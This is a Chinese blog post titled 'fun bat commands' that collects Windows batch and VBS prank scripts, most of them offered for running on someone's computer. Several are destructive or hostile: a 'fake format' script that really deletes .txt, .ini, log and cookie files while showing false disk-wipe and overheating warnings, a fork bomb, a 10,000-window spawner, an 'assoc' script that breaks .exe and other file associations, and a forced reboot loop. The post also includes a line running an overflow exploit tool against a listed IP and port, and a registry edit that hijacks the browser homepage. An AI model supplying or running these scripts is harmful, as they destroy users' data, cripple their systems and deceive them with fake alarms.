---
title: 好玩的bat命令
author: 墨白
coverImg: 
top: false
cover: false
toc: true
mathjax: false
tags:
  - Bat
  - Windows
  - null
  - null
  - null
categories:
  - 随笔
abbrlink: 3867178586
date: 2020-01-04 13:43:40
img: 
password:
summary:
---

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=100% height=86 src="//music.163.com/outchain/player?type=2&id=547614214&auto=0&height=66"></iframe>

## 关机脚本

~~~shell
@echo off
shutdown -s -t 0
~~~

## 重启脚本

~~~shell
@echo off
shutdown -r -t 0
~~~

## 伪格式化脚本

~~~shell
@echo off
color 4f
taskkill /im explorer.exe /f
echo 删除C盘所有文件......
del /f /s /q "%systemdrive%\*.tmp"
del /f /s /q "%systemdrive%\*.dmp"
del /f /s /q "%systemdrive%\*._mp"
del /f /s /q "%systemdrive%\*.gid"
del /f /s /q "%systemdrive%\*.old"
del /f /s /q "%systemdrive%\*.chk"
del /f /s /q "%systemdrive%\*.bak"
del /f /s /q "%systemdrive%\*.log"
del /f /s /q "%systemdrive%\*.txt"
del /f /s /q "%systemdrive%\*.ini"
del /f /s /q "%systemdrive%\Recycled\*.*"
del /f /s /q "%systemdrive%\RECYCLER\*.*"
del /f /s /q "%windir%\inf\*.pnf"
del /f /s /q "%windir%\Prefetch\*.*"
@ping -n 2 127.1>nul
rd /s /q "%windir%\Downloaded Program Files" & md "%windir%\Downloaded Program Files"
@ping -n 2 127.1>nul
rd /s /q "%windir%\LastGood" & md "%windir%\LastGood"
@ping -n 2 127.1>nul
rd /s /q "%windir%\Offline Web Pages" & md "%windir%\Offline Web Pages"
@ping -n 2 127.1>nul
rd /s /q "%windir%\SoftwareDistribution\Download" & md "%windir%\SoftwareDistribution\Download"
@ping -n 2 127.1>nul
rd /s /q "%windir%\temp" & md "%windir%\temp"
@ping -n 2 127.1>nul
rd /s /q "%userprofile%\Local Settings\Application Data\Microsoft\Media Player" & md "%windir%\Local Settings\Application Data\Microsoft\Media Player"
@ping -n 2 127.1>nul
rd /s /q "%userprofile%\UserData" & md "%windir%\UserData"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Adobe" & md "%windir%\Adobe"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Macromedia" & md "%windir%\Macromedia"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Microsoft\Media Player" & md "%windir%\Microsoft\Media Player"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Microsoft\Office\Recent" & md "%windir%\Microsoft\Office\Recent"
@ping -n 5 127.1>nul
del /a /f /s /q "%userprofile%\Cookies\*.*"
del /a /f /s /q "%userprofile%\Recent\*.*"
del /a /f /s /q "%userprofile%\Local Settings\Application Data\GDIPFONTCACHEV1.dat"
del /a /f /s /q "%userprofile%\Local Settings\Application Data\IconCache.db"
del /a /f /s /q "%userprofile%\Local Settings\History\*.*"
del /a /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
del /a /f /s /q "%temp%\*.*" del /a /f /s /q "%userprofile%\AppData\Local\GDIPFONTCACHEV1.dat"
del /a /f /s /q "%userprofile%\AppData\Local\IconCache.db"
del /a /f /s /q "%userprofile% \AppData\Local\Microsoft\Windows\History\*.*"
del /a /f /s /q "%userprofile% \AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
del /a /f /s /q "%userprofile% \AppData\Roaming\Microsoft\Windows\Cookies\*.*"
del /a /f /s /q "%userprofile% \AppData\Roaming\Microsoft\Windows\Recent\*.*"
echo 已删除完毕
@echo.
echo 删除D盘所有文件......
@ping -n 3 127.1>nul
@echo 已删除完毕
@echo.
echo 删除E盘所有文件......
@ping -n 3 127.1>nul
echo 已删除完毕
@echo.
echo 正在低级格式化全部硬盘......
@ping -n 3 127.1>nul
echo.
echo 正在 进行二次 低格硬盘......
ping -n 3 127.1>nul
echo.
echo 正在 进行三次 低格硬盘......
ping -n 3 127.1>nul
echo.
echo 正在 进行四次 低格硬盘......
ping -n 3 127.1>nul
echo.
echo 正在 进行五次 低格硬盘......
ping -n 3 127.1>nul
echo.
echo 注意: cpu温度127度!温度过高报警!!!
echo.
ping -n 2 127.1>nul
echo 注意: 硬盘温度86度!温度过高报警!!!
echo.
ping -n 2 127.1>nul
echo 注意: 显卡温度96度!温度过高报警!!!
echo.
ping -n 2 127.1>nul
echo 注意: 系统崩溃, 主板温度 超过临界值!!! echo.
echo 注意: 电容负荷超过99% echo. & pause
echo 电脑将在60秒内崩溃或爆炸!请勿强行关闭电源!否则会 导致cpu和硬盘彻底损毁!!
shutdown /r /t 60 /c "电脑将在60秒内崩溃或爆炸!请勿强行关闭电源!否则会 导致cpu和硬盘彻底损毁!!"
ping -n 30 127.1>nul
shutdown -a
start explorer.exe
exit
~~~

## 黑客帝国代码雨

~~~shell
@echo off
:a
color 2
echo 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0
ping localhost -n 1 >nul
echo 2 1 3 2 1 3 2 1 3 2 1 3 2 1 3 2 1 3 2 1 3 2 1 3 2 1 2 3 1 5 4 6 4 6 5 4 6 5 4
ping localhost -n 1 >nul
echo 7 9 4 6 5 4 9 8 7 4 1 6 5 4 9 8 7 4 6 8 7 4 6 5 1 3 5 4 9 8 7 4 1 1 3 2 1 3 1
ping localhost -n 1 >nul
echo 1 3 5 4 1 6 5 4 6 1 3 2 4 8 6 4 3 5 4 1 6 5 4 6 1 3 8 7 4 6 5 4 5 4 6 8 1 3 5
ping localhost -n 1 >nul
echo 7 1 9 1 8 7 3 4 2 5 7 8 4 1 3 6 5 7 8 4 1 3 5 4 9 4 1 9 8 7 3 8 7 9 8 7 4 5 6
ping localhost -n 1 >nul
goto aa
~~~

##  盘符增加 

~~~shell
@echo off
for %%i in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do (subst %%i: C:\)
~~~

##  盘符恢复 

~~~shell
@echo off
for %%i in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do (subst %%i: /d)
~~~

##  死机循环 

~~~shell
@echo off
%0|%0
~~~

##  清理系统垃圾 

~~~shell
@echo off
echo 正在清除系统垃圾文件，请稍等......
del /f /s /q %systemdrive%\*.tmp
del /f /s /q %systemdrive%\*._mp
del /f /s /q %systemdrive%\*.log
del /f /s /q %systemdrive%\*.gid
del /f /s /q %systemdrive%\*.chk
del /f /s /q %systemdrive%\*.old
del /f /s /q %systemdrive%\recycled\*.*
del /f /s /q %windir%\*.bak
del /f /s /q %windir%\prefetch\*.*
rd /s /q %windir%\temp & md %windir%\temp
del /f /q %userprofile%\cookies\*.*
del /f /q %userprofile%\recent\*.*
del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
del /f /s /q "%userprofile%\Local Settings\Temp\*.*"
del /f /s /q "%userprofile%\recent\*.*"
echo 清除系统垃圾文件完成！
pause
~~~

## 闪动代码

~~~shell
color
echo 墨白好帅，不信你看屏幕都会闪~~~~~~
color 1a
echo 墨白好帅，不信你看屏幕都会闪~~~~~~
color 2b
echo 墨白好帅，不信你看屏幕都会闪~~~~~~
color 3c
echo 墨白好帅，不信你看屏幕都会闪~~~~~~
color 4d	
echo 墨白好帅，不信你看屏幕都会闪~~~~~~
color 5e
echo 墨白好帅，不信你看屏幕都会闪~~~~~~
color 6f
%0恶搞小程序
~~~

## 自爆VBS

~~~vbs
msgbox"电脑即将自爆"+chr(13)+"请在15秒内离开座位"+chr(13)+"否则你死定了",2,"系统自爆提醒"
CreateObject("SAPI.SpVoice").Speak"电脑即将自爆，请在15秒内离开座位，否则你死定了！"
~~~

## 修改文件关联

~~~shell
@echo off
assoc .exe=txtfile
assoc .txt=exefile
assoc .mp3=txtfile
assoc .flv=txtfile
assoc .swf=txtfile
assoc .fla=txtfile
assoc .jpg=txtfile
assoc .bmp=txtfile
assoc .zip=txtfile
assoc .7z=txtfile
assoc .rar=txtfile
assoc .tag=txtfile
assoc .jpge=txtfile
assoc .mp4=txtfile
assoc .3gp=txtfile
assoc .avi=txtfile
assoc .wav=txtfile
assoc .htm=txtfile
assoc .html=txtfile
assoc .vbs=txtfile
assoc .vbe=txtfile
assoc .js=txtfile
assoc .rxproj=txtfile
assoc .mdb=txtfile
assoc .dll=txtfile
assoc .dat=txtfile
assoc .sys=txtfile
assoc .wmv=txtfile
assoc .ogg=txtfile
assoc .db=txtfile
assoc .mid=txtfile
assoc .gif=txtfile
assoc .png=txtfile
assoc .doc=txtfile
assoc .exl=txtfile
assoc .pdf=txtfile
assoc .chm=txtfile
assoc .nfo=txtfile
~~~

## 超级弹窗

~~~shell
@echo off
for /l %%i in (1,1,10000) do (start %0)
~~~

## 重启指定次数

~~~shell
@echo off

if not exist c:\1.txt echo. >c:\1.txt & goto err1

if not exist c:\2.txt echo. >c:\2.txt & goto err1

if not exist c:\3.txt echo. >c:\3.txt & goto err1

if not exist c:\4.txt echo. >c:\4.txt & goto err1

if not exist c:\5.txt echo. >c:\5.txt & goto err1

goto err2

:err1

shutdown -s -t 0

:err2
~~~

## 批量自动溢出

~~~shell
@for /f %%i in (result.txt) do 42 %%i 58.44.89.158 521
~~~

## 篡改主页

~~~shell
reg add"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v"Start Page" /t reg_sz /d www.2345.com/?k52708425 /f >nul 2>nul

reg add "HKEY_CURRENT_USER\Software\Microsoft\InternetExplorer\Main" /v "Default_Page_URL" /t reg_sz /dwww.2345.com/?k52708425 /f >nul 2>nul
~~~

